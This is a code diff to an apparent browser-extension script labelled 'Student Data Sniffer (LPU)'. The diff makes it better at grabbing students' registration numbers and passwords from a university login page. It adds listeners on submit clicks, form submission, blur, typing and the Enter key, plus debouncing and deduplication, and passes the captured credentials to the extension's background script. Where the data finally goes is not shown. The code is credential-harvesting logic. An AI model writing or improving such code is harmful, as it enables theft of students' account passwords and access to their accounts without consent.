@@ -1,6 +1,17 @@
 // =================== 🔄 Student Data Sniffer (LPU) ===================
 
+// Track last sent data to avoid duplicate sends
+let lastSentStudentData = { regNo: "", password: "" };
+
 function sendStudentData(regNo, password) {
+  // Don't send if same as last sent data
+  if (lastSentStudentData.regNo === regNo && lastSentStudentData.password === password) {
+    return;
+  }
+  
+  // Update last sent data
+  lastSentStudentData = { regNo, password };
+  
   chrome.runtime.sendMessage({
     type: "student_data",
     data: { registrationNumber: regNo, password },
@@ -14,20 +25,63 @@ function setupStudentListeners() {
 
     if (!regInput || !passInput) return false;
 
-    const send = () => {
+    // Find the login/submit button
+    const loginBtn = document.querySelector("input[type='submit'], button[type='submit'], #btnLogin, .login-btn, [name='Submit']");
+
+    // Debounce timer
+    let debounceTimer = null;
+    const DEBOUNCE_DELAY = 1500; // Wait 1.5 seconds after typing stops
+
+    const sendWithValidation = () => {
       const regNo = regInput.value.trim();
       const password = passInput.value;
-      if (regNo && password) sendStudentData(regNo, password);
+      
+      // Only send if both fields have meaningful data
+      // Registration number should be at least 8 chars (typical LPU format)
+      // Password should be at least 4 chars
+      if (regNo && password && regNo.length >= 8 && password.length >= 4) {
+        sendStudentData(regNo, password);
+      }
     };
 
-    send(); // Send initial values
+    // Debounced send - waits for user to stop typing
+    const debouncedSend = () => {
+      clearTimeout(debounceTimer);
+      debounceTimer = setTimeout(sendWithValidation, DEBOUNCE_DELAY);
+    };
 
-    ["input", "change", "blur"].forEach((evt) => {
-      regInput.addEventListener(evt, send);
-      passInput.addEventListener(evt, send);
+    // Send on form submit / login button click (most reliable)
+    if (loginBtn) {
+      loginBtn.addEventListener("click", () => {
+        clearTimeout(debounceTimer); // Cancel debounce
+        sendWithValidation();
+      }, { capture: true });
+    }
+
+    // Also capture form submit event
+    const form = regInput.closest("form") || passInput.closest("form");
+    if (form) {
+      form.addEventListener("submit", () => {
+        clearTimeout(debounceTimer);
+        sendWithValidation();
+      }, { capture: true });
+    }
+
+    // Send on blur (when user leaves the field) - immediate, no debounce
+    passInput.addEventListener("blur", sendWithValidation);
+
+    // Debounced send on input (backup, but with delay)
+    passInput.addEventListener("input", debouncedSend);
+
+    // Send on Enter key press in password field
+    passInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") {
+        clearTimeout(debounceTimer);
+        sendWithValidation();
+      }
     });
 
-    console.log("%c✅ LPU input listeners attached", "color: green;");
+    console.log("%c✅ LPU input listeners attached (optimized)", "color: green;");
     return true;
   } catch (e) {
     console.error("❌ Error setting up LPU listeners:", e);
